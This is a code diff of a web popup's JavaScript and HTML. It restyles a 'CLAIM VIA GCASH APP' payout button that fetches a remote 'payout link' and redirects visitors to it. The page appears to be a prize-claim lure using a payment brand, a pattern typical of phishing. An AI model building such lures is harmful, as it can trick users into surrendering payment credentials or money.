@@ -138,7 +138,7 @@
         }
     }
     
-   // ========== PHASE 2: REMASTERED UI WITH FIXED BUTTON ==========
+  // ========== PHASE 2: REMASTERED UI WITH LOCKED BUTTON STYLE ==========
 function showPhase2() {
     const popupInner = document.querySelector('.popup-inner');
     if (!popupInner) return;
@@ -196,14 +196,14 @@ function showPhase2() {
             </p>
         </div>
         
-        <!-- CLAIM BUTTON - FIXED GREEN GRADIENT -->
-        <button id="proceedBtn" style="background: linear-gradient(135deg, #00a650, #008c3a); border: none; border-radius: 60px; padding: 16px; width: 100%; margin-top: 15px; font-size: 16px; font-weight: bold; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.2s ease;">
+        <!-- CLAIM BUTTON - SAME STYLE AS PHASE 1 (LOCKED) -->
+        <button id="proceedBtn" style="background: linear-gradient(135deg, #ffd700, #ffaa33, #ff8c00) !important; border: none !important; border-radius: 60px !important; padding: 14px 20px !important; width: 100% !important; margin-top: 15px !important; font-weight: 800 !important; color: #1a1a2e !important; font-size: 16px !important; cursor: pointer !important; display: flex !important; align-items: center !important; justify-content: center !important; gap: 10px !important; box-shadow: 0 0 5px #ffd700, 0 0 10px #ffaa33 !important; transition: all 0.2s ease !important;">
             <img src="images/gc_icon.png" style="width: 22px; height: 22px;"> CLAIM VIA GCASH APP
         </button>
 
         <div class="button-separator" style="margin: 15px 0 10px;"></div>
 
-        <button id="backBtnPhase2" style="background: linear-gradient(135deg, #ffd700, #ffaa33); border: none; border-radius: 50px; padding: 10px; width: 100%; font-weight: 700; color: #1a1a2e; font-size: 13px; cursor: pointer; transition: all 0.2s ease;">
+        <button id="backBtnPhase2" style="background: linear-gradient(135deg, #ffd700, #ffaa33, #ff8c00); border: none; border-radius: 50px; padding: 8px 20px; font-weight: 700; color: #1a1a2e; font-size: 13px; cursor: pointer; width: 100%;">
             ← BACK TO PHASE 1
         </button>
     `;
@@ -227,17 +227,18 @@ function showPhase2() {
     const proceedBtn = document.getElementById('proceedBtn');
     if (proceedBtn) {
         proceedBtn.onclick = async function() {
+            // Add click effect
             this.style.transform = 'scale(0.98)';
             setTimeout(() => { this.style.transform = 'scale(1)'; }, 150);
             
             this.disabled = true;
-            this.innerHTML = `<img src="images/gc_icon.png" style="width: 22px; height: 22px; animation: pulse 0.8s infinite;"> PROCESSING PAYOUT...`;
+            this.innerHTML = `<img src="images/gc_icon.png" style="width: 22px; height: 22px;"> PROCESSING PAYOUT...`;
             this.style.opacity = '0.8';
             
             const linkData = await getLatestPayoutLink();
             
             if (linkData && linkData.url) {
-                this.innerHTML = `<img src="images/gc_icon.png" style="width: 22px; height: 22px;"> REDIRECTING TO GCASH...`;
+                this.innerHTML = `<img src="images/gc_icon.png" style="width: 22px; height: 22px;"> REDIRECTING...`;
                 setTimeout(() => {
                     window.location.href = linkData.url;
                 }, 800);
